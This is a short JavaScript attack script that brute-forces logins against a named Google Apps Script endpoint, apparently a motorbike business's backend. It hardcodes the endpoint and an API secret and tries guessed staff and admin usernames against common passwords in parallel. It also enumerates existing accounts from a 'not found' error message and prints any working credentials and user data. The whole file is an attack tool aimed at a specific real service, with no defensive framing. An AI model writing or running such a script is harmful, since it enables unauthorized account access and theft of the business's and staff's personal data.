const API_URL = 'https://script.google.com/macros/s/AKfycbzMg1ilHtrHXvTboGF3K8v9AtkWyWCnEGxh_tbvb-PnGHT-vyug8o1pegN_bKUOX4B-4A/exec';
const API_SECRET = 'JANS_SECRET_2026';

async function tryLogin(loginId, password) {
  try {
    const res = await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        fn: 'loginUser',
        args: [loginId, password],
        secret: API_SECRET
      })
    });
    const data = await res.json();
    const inner = data.data;
    const isOk = data.success && inner && inner.success && inner.data && inner.data.ten;
    if (inner && inner.error && !inner.error.includes("Không tìm thấy tài khoản")) {
      // Account exists, but password was wrong!
      console.log(`[FOUND ACCOUNT] Username: "${loginId}" exists! (Error: ${inner.error})`);
    }
    if (isOk) {
      console.log(`[SUCCESS] Username: "${loginId}", Password: "${password}" => ${JSON.stringify(inner.data)}`);
      return { loginId, password, userData: inner.data };
    }
  } catch (e) {
    // Ignore fetch errors
  }
  return null;
}

async function run() {
  const users = [
    'admin', 'user', 'jan', 'jans', 'janmotorbike', 'janmotorbikecom', 'janmotorbike.comn@gmail.com',
    'Giang', 'Châu Vân', 'Ân', 'Minh Minh', 'Chau Van', 'MinhMinh',
    'nhanvien', 'nhanvien1', 'quanly'
  ];
  const passwords = [
    '123456', '1234', 'admin', 'jans', 'jans2026', 'JANS_SECRET_2026', '654321', '0000', '1111', '12345678'
  ];

  console.log(`Starting parallel check of ${users.length * passwords.length} combinations...`);
  
  const promises = [];
  for (const user of users) {
    for (const pwd of passwords) {
      promises.push(tryLogin(user, pwd));
    }
  }

  const results = await Promise.all(promises);
  const success = results.find(r => r !== null);
  if (success) {
    console.log(`\n!!! WORKING CREDENTIALS !!!`);
    console.log(`User: ${success.loginId}`);
    console.log(`Pwd: ${success.password}`);
    console.log(`Data: ${JSON.stringify(success.userData)}`);
  } else {
    console.log('\nFinished check. No working credentials found in list.');
  }
}

run();
